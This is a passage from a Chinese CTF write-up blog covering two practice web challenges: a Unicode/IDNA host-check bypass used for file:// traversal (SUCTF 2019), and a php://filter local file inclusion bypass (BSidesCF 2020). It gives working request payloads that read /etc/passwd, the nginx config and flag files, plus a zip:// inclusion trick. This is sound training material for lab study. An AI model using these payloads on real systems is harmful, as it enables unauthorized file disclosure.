</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=s2>&#34;我扌 your problem? 333&#34;</span>
</span></span></code></pre></td></tr></table></div></div><p>三个if都是判断<code>host == 'suctf.cc'</code>，但是需要最后一个host判断成功才可以读取文件，读取文件应该使用的是php伪协议，但是前面的不会了，去看wp。大概看的意思还是用unicode欺骗，相关题目[[ASIS 2019]Unicorn shop](#[ASIS 2019]Unicorn shop)，使用unicode经过解析以后还是原来的字符，但是可以绕过判断<code>==</code>，回过头来注意到了<strong>第二个</strong>if中有<code>newhost.append(h.encode('idna').decode('utf-8'))</code>进行了一波编码，那么问题就出在了这里。</p><p>所以我们只需要找出随便一个host里字符的其他unicode值，这个值在经过编码以后还可以变成原来的字母。其他wp都找的是最后的字母<code>c</code>，那么我就找第一个字母<code>s</code>验证一下，贴一个unicode的网站：https://www.compart.com/en/unicode/U+0073，进入网站以后可以搜索，然后下面有相关的字符，<strong>需要多试几个</strong>。</p><p><img class=lazyload data-src=https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210310102326.png data-srcset="https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210310102326.png, https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210310102326.png 1.5x, https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210310102326.png 2x" data-sizes=auto alt=https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210310102326.png title=https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210310102326.png></p><p>我选出的是这个字符<code>𝐬</code>，我们先使用url编码一下防止参数出现错误，尝试读一下passwd：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>/getUrl?url=file://%F0%9D%90%ACuctf.cc/../../../../../etc/passwd
</span></span></code></pre></td></tr></table></div></div><p><img class=lazyload data-src=https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210310102513.png data-srcset="https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210310102513.png, https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210310102513.png 1.5x, https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210310102513.png 2x" data-sizes=auto alt=https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210310102513.png title=https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210310102513.png></p><p>flag并不在其中，并且也不再根目录下，根据题目中有<code>nginx</code>应该是一个指路的，去读一读nginx的配置文件。从师傅那学到的nginx配置文件所在位置，以后说不定自己也用得到：</p><blockquote><p>配置文件存放目录：/etc/nginx、/usr/local/nginx/conf/nginx.conf</p><p>主配置文件：/etc/nginx/conf/nginx.conf</p><p>管理脚本：/usr/lib64/systemd/system/nginx.service</p><p>模块：/usr/lisb64/nginx/modules</p><p>应用程序：/usr/sbin/nginx</p><p>程序默认存放位置：/usr/share/nginx/html</p><p>日志默认存放位置：/var/log/nginx</p></blockquote><p>读配置文件</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>/getUrl?url=file://%F0%9D%90%ACuctf.cc/../../../../../usr/local/nginx/conf/nginx.conf
</span></span></code></pre></td></tr></table></div></div><p><img class=lazyload data-src=https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210310103257.png data-srcset="https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210310103257.png, https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210310103257.png 1.5x, https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210310103257.png 2x" data-sizes=auto alt=https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210310103257.png title=https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210310103257.png></p><p>读flag</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>/getUrl?url=file://%F0%9D%90%ACuctf.cc/../../../../../usr/fffffflag
</span></span></code></pre></td></tr></table></div></div><p><img class=lazyload data-src=https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210310103323.png data-srcset="https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210310103323.png, https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210310103323.png 1.5x, https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210310103323.png 2x" data-sizes=auto alt=https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210310103323.png title=https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210310103323.png></p><p>参考的博客链接：</p><p><a href=https://www.xmsec.cc/suctf19-wp/ target=_blank rel="noopener noreffer">https://www.xmsec.cc/suctf19-wp/</a></p><p><a href=https://xz.aliyun.com/t/6042#toc-24 target=_blank rel="noopener noreffer">https://xz.aliyun.com/t/6042#toc-24</a></p><p><a href=https://i.blackhat.com/USA-19/Thursday/us-19-Birch-HostSplit-Exploitable-Antipatterns-In-Unicode-Normalization.pdf target=_blank rel="noopener noreffer">https://i.blackhat.com/USA-19/Thursday/us-19-Birch-HostSplit-Exploitable-Antipatterns-In-Unicode-Normalization.pdf</a></p><hr><h1 id=bsidescf-2020had-a-bad-day class=headerLink><a href=#bsidescf-2020had-a-bad-day class=header-mark></a>[BSidesCF 2020]Had a bad day</h1><p>看这个标题我推一下OWRLD ORDER的<a href=https://www.bilibili.com/video/BV1Bb411K7Gd target=_blank rel="noopener noreffer">Have a nice day</a></p><p>页面两个按钮，一个康狗狗照片，一个康猫猫照片，点按钮以后url就会改变为</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>/index.php?category=woofers
</span></span></code></pre></td></tr></table></div></div><p>尝试输入flag会显示</p><p><img class=lazyload data-src=https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210310175019.png data-srcset="https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210310175019.png, https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210310175019.png 1.5x, https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210310175019.png 2x" data-sizes=auto alt=https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210310175019.png title=https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210310175019.png></p><p>只能有<code>woofers</code>和<code>meowers</code>可以通过，尝试了下php的<code>filter</code>伪协议读文件</p><p><img class=lazyload data-src=https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210310175611.png data-srcset="https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210310175611.png, https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210310175611.png 1.5x, https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210310175611.png 2x" data-sizes=auto alt=https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210310175611.png title=https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210310175611.png></p><p>读出来了，但是解密以后狗狗和猫猫这两个网页没啥作用：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-html data-lang=html><span class=line><span class=cl><span class=p>&lt;</span><span class=nt>center</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>	<span class=p>&lt;</span><span class=nt>h4</span><span class=p>&gt;</span> Woof! Woof! <span class=p>&lt;/</span><span class=nt>h4</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl><span class=p>&lt;/</span><span class=nt>center</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl><span class=p>&lt;</span><span class=nt>img</span> <span class=na>style</span><span class=o>=</span><span class=s>&#34;width:100%&#34;</span> <span class=na>src</span><span class=o>=</span><span class=s>&#34;img/dog/&lt;?php echo rand(1,10)?&gt;.jpg&#34;</span><span class=p>&gt;</span>
</span></span></code></pre></td></tr></table></div></div><p>多尝试以后发现可以读<code>index</code>，下面是主要的源码：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
</span></span><span class=line><span class=cl><span class=nv>$file</span> <span class=o>=</span> <span class=nv>$_GET</span><span class=p>[</span><span class=s1>&#39;category&#39;</span><span class=p>];</span>
</span></span><span class=line><span class=cl><span class=k>if</span><span class=p>(</span><span class=nx>isset</span><span class=p>(</span><span class=nv>$file</span><span class=p>)){</span>
</span></span><span class=line><span class=cl><span class=k>if</span><span class=p>(</span> <span class=nx>strpos</span><span class=p>(</span> <span class=nv>$file</span><span class=p>,</span> <span class=s2>&#34;woofers&#34;</span> <span class=p>)</span> <span class=o>!==</span>  <span class=k>false</span> <span class=o>||</span> <span class=nx>strpos</span><span class=p>(</span> <span class=nv>$file</span><span class=p>,</span> <span class=s2>&#34;meowers&#34;</span> <span class=p>)</span> <span class=o>!==</span>  <span class=k>false</span> <span class=o>||</span> <span class=nx>strpos</span><span class=p>(</span> <span class=nv>$file</span><span class=p>,</span> <span class=s2>&#34;index&#34;</span><span class=p>)){</span>
</span></span><span class=line><span class=cl>						<span class=k>include</span> <span class=p>(</span><span class=nv>$file</span> <span class=o>.</span> <span class=s1>&#39;.php&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>					<span class=p>}</span>
</span></span><span class=line><span class=cl>					<span class=k>else</span><span class=p>{</span>
</span></span><span class=line><span class=cl>						<span class=k>echo</span> <span class=s2>&#34;Sorry, we currently only support woofers and meowers.&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>					<span class=p>}</span>
</span></span><span class=line><span class=cl>				<span class=p>}</span>
</span></span><span class=line><span class=cl>				<span class=cp>?&gt;</span><span class=err>
</span></span></span></code></pre></td></tr></table></div></div><p>可以看到if判断中需要字符串包含<code>woofers</code>、<code>meowers</code>、<code>index</code>，那么我们只需要在filter伪协议中插入字符串绕过判断即可。</p><p><strong>需要知道的</strong>：filter可以设定一个或多个过滤器名称，以管道符<code>\</code>分隔，所以构造payload：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>/index.php?category=php://filter/meowers/convert.base64-encode/resource=flag
</span></span></code></pre></td></tr></table></div></div><p>读出来以后解密即可获得flag</p><p><img class=lazyload data-src=https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210310181106.png data-srcset="https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210310181106.png, https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210310181106.png 1.5x, https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210310181106.png 2x" data-sizes=auto alt=https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210310181106.png title=https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210310181106.png></p><p>搜索的时候学到了一个其他的截断</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>zip://test.zip#hello.html.php
</span></span></code></pre></td></tr></table></div></div><p>代表当前目录下的test.zip压缩包里面的hello.html.php，于是包含成功。</p></div><div class=post-footer id=post-footer><div class=post-info><div class=post-info-line><div class=post-info-mod><span>更新于 2021-01-18</span></div><div class=post-info-license></div></div><div class=post-info-line><div class=post-info-md></div><div class=post-info-share><span></span></div></div></div><div class=post-info-more><section class=post-tags><i class="fas fa-tags fa-fw"></i>&nbsp;<a href=/tags/web/>Web</a>,&nbsp;<a href=/tags/buuctf_web/>BUUCTF_Web</a></section><section><span><a href=javascript:void(0); onclick=window.history.back()>返回</a></span>&nbsp;|&nbsp;<span><a href=/>主页</a></span></section></div><div class=post-nav><a href=/posts/gxyctf2019ping-ping-ping/ class=prev rel=prev title="GXYCTF2019 Ping Ping Ping"><i class="fas fa-angle-left fa-fw"></i>GXYCTF2019 Ping Ping Ping</a>
<a href=/posts/swpu2019web1/ class=next rel=next title="SWPU2019 Web1">SWPU2019 Web1<i class="fas fa-angle-right fa-fw"></i></a></div></div><div id=comments><div id=valine class=comment></div><noscript>Please enable JavaScript to view the comments powered by <a href=https://valine.js.org/>Valine</a>.</noscript></div></article></div></main><footer class=footer><div class=footer-container><div class=footer-line>由 <a href=https://gohugo.io/ target=_blank rel="noopener noreffer" title="Hugo 0.99.1">Hugo</a> 强力驱动&nbsp;|&nbsp;主题 - <a href=https://github.com/HEIGE-PCloud/DoIt target=_blank rel="noopener noreffer" title="DoIt 0.2.13"><i class="far fa-edit fa-fw"></i> DoIt</a></div><div class=footer-line><i class="far fa-copyright fa-fw"></i><span itemprop=copyrightYear>2020 - 2022</span><span class=author itemprop=copyrightHolder>&nbsp;<a href=/ target=_blank rel="noopener noreferrer">Braindance</a></span>&nbsp;|&nbsp;<span class=license><a rel="license external nofollow noopener noreffer" href=https://creativecommons.org/licenses/by-nc/4.0/ target=_blank>CC BY-NC 4.0</a></span></div><div class=footer-line></div><div class=footer-line></div></div></footer></div><div id=fixed-buttons><a href=#back-to-top id=back-to-top-button class=fixed-button title=回到顶部><i class="fas fa-arrow-up fa-fw"></i>
</a><a href=# id=view-comments class=fixed-button title=查看评论><i class="fas fa-comment fa-fw"></i></a></div><div class=assets><script type=text/javascript src=https://cdn.jsdelivr.net/npm/autocomplete.js@0.38.0/dist/autocomplete.min.js></script><script type=text/javascript src=https://cdn.jsdelivr.net/npm/fuse.js@6.4.6/dist/fuse.min.js></script><script type=text/javascript src=https://cdn.jsdelivr.net/npm/lazysizes@5.3.2/lazysizes.min.js></script><script type=text/javascript src=https://cdn.jsdelivr.net/npm/topbar@1.0.1/topbar.min.js></script><script type=text/javascript src=https://cdn.jsdelivr.net/npm/@sliphua/pjax@2.4.0/dist/pjax.min.js></script><script type=text/javascript src=/js/theme.min.js defer></script><script type=text/javascript>window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag("js",new Date),gtag("config","UA-176925141-1",{anonymize_ip:!0})</script><script type=text/javascript src="https://www.googletagmanager.com/gtag/js?id=UA-176925141-1" async></script><script>var _hmt=_hmt||[];(function(){var e,t=document.createElement("script");t.src="https://hm.baidu.com/hm.js?3b1ab845351bb3a8ee808b639bca6ce5",e=document.getElementsByTagName("script")[0],e.parentNode.insertBefore(t,e)})()</script></div><div class=pjax-assets><script type=text/javascript>window.config={code:{copyTitle:"复制到剪贴板",maxShownLines:10},comment:{valine:{appId:"shaenDlkzwy9NvdCNJVrJspu-MdYXbMMI",appKey:"e074xMKoSw3B9kWmBediaBE9",avatar:"mp",el:"#valine",emojiCDN:"https://cdn.jsdelivr.net/gh/guobang-yoo/CDN@master/emoji/",emojiMaps:{"2233_卖萌":"2233/卖萌n.png","2233_吃惊":"2233/吃惊n.png","2233_吐魂":"2233/吐魂.png","2233_喝水":"2233/喝水.png","2233_困惑":"2233/困惑n.png","2233_大哭":"2233/大哭.png","2233_大笑":"2233/大笑n.png","2233_委屈":"2233/委屈.png","2233_怒":"2233/怒.png","2233_无言":"2233/无言.png","2233_汗":"2233/汗n.png","2233_疑问":"2233/疑问n.png","2233_第一":"2233/第一.png","2233_耶":"2233/耶.png","2233_郁闷":"2233/郁闷.png",tv_doge:"xiaodianshi/doge.gif","tv_亲亲":"xiaodianshi/亲亲.gif","tv_偷笑":"xiaodianshi/偷笑.gif","tv_再见":"xiaodianshi/再见.gif","tv_发怒":"xiaodianshi/发怒.gif","tv_发财":"xiaodianshi/发财.gif","tv_可爱":"xiaodianshi/可爱.gif","tv_吐血":"xiaodianshi/吐血.gif","tv_呆":"xiaodianshi/呆.gif","tv_呕吐":"xiaodianshi/呕吐.gif","tv_困":"xiaodianshi/困.gif","tv_坏笑":"xiaodianshi/坏笑.gif","tv_大佬":"xiaodianshi/大佬.gif","tv_大哭":"xiaodianshi/大哭.gif","tv_委屈":"xiaodianshi/委屈.gif","tv_害羞":"xiaodianshi/害羞.gif","tv_尴尬":"xiaodianshi/尴尬.gif","tv_微笑":"xiaodianshi/微笑.gif","tv_思考":"xiaodianshi/思考.gif","tv_打脸":"xiaodianshi/打脸.gif","tv_抓狂":"xiaodianshi/抓狂.gif","tv_抠鼻子":"xiaodianshi/抠鼻子.gif","tv_斜眼笑":"xiaodianshi/斜眼笑.gif","tv_晕":"xiaodianshi/晕.gif","tv_流汗":"xiaodianshi/流汗.gif","tv_流鼻血":"xiaodianshi/流鼻血.gif","tv_点赞":"xiaodianshi/点赞.gif","tv_生气":"xiaodianshi/生气.gif","tv_生病":"xiaodianshi/生病.gif","tv_疑问":"xiaodianshi/疑问.gif","tv_白眼":"xiaodianshi/白眼.gif","tv_睡着":"xiaodianshi/睡着.gif","tv_笑哭":"xiaodianshi/笑哭.gif","tv_腼腆":"xiaodianshi/腼腆.gif","tv_色":"xiaodianshi/色.gif","tv_调皮":"xiaodianshi/调皮.gif","tv_鄙视":"xiaodianshi/鄙视.gif","tv_闭嘴":"xiaodianshi/闭嘴.gif","tv_难过":"xiaodianshi/难过.gif","tv_馋":"xiaodianshi/馋.gif","tv_黑人问号":"xiaodianshi/黑人问号.gif","tv_鼓掌":"xiaodianshi/鼓掌.gif","蛆音娘_OK":"quyinniang/OK.png","蛆音娘_die":"quyinniang/die.png","蛆音娘_偷看":"quyinniang/偷看.png","蛆音娘_卖萌":"quyinniang/卖萌.png","蛆音娘_吃惊":"quyinniang/吃惊q.png","蛆音娘_吃瓜群众":"quyinniang/吃瓜群众.png","蛆音娘_吐血":"quyinniang/吐血.png","蛆音娘_哭泣":"quyinniang/哭泣q.png","蛆音娘_哼":"quyinniang/哼.png","蛆音娘_大笑":"quyinniang/大笑.png","蛆音娘_害怕":"quyinniang/害怕.png","蛆音娘_扶额":"quyinniang/扶额.png","蛆音娘_摇头":"quyinniang/摇头.png","蛆音娘_无语":"quyinniang/无语q.png","蛆音娘_机智":"quyinniang/机智.png","蛆音娘_滑稽":"quyinniang/滑稽.png","蛆音娘_生气":"quyinniang/生气.png","蛆音娘_疑问":"quyinniang/疑问.png","蛆音娘_睡觉觉":"quyinniang/睡觉觉.png","蛆音娘_肥皂":"quyinniang/肥皂.png"},enableQQ:!1,highlight:!0,lang:"zh-cn",pageSize:5,placeholder:"Just go go",recordIP:!0,visitor:!0}},lightGallery:{actualSize:!1,exThumbImage:"data-thumbnail",hideBarsDelay:2e3,selector:".lightgallery",speed:400,thumbContHeight:80,thumbWidth:80,thumbnail:!0},search:{distance:100,findAllMatches:!1,fuseIndexURL:"/index.json",highlightTag:"em",ignoreFieldNorm:!1,ignoreLocation:!1,isCaseSensitive:!1,location:0,maxResultLength:10,minMatchCharLength:2,noResultsFound:"没有找到结果",snippetLength:50,threshold:.3,type:"fuse",useExtendedSearch:!1},twemoji:!0}</script><script type=text/javascript src=https://cdn.jsdelivr.net/npm/valine@1.4.16/dist/Valine.min.js defer></script><script type=text/javascript src=/js/valine.min.js defer></script><script type=text/javascript src=https://cdn.jsdelivr.net/npm/twemoji@13.1.0/dist/twemoji.min.js defer></script><script type=text/javascript src=/js/twemoji.min.js defer></script><script type=text/javascript src=https://cdn.jsdelivr.net/npm/lightgallery.js@1.4.0/dist/js/lightgallery.min.js></script><script type=text/javascript src=https://cdn.jsdelivr.net/npm/lg-thumbnail.js@1.2.0/dist/lg-thumbnail.min.js></script><script type=text/javascript src=https://cdn.jsdelivr.net/npm/lg-zoom.js@1.3.0/dist/lg-zoom.min.js></script><script type=text/javascript src=https://cdn.jsdelivr.net/npm/clipboard@2.0.8/dist/clipboard.min.js></script><link rel=stylesheet href=/lib/valine/valine.min.css><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/lightgallery.js@1.4.0/dist/css/lightgallery.min.css></div></body></html>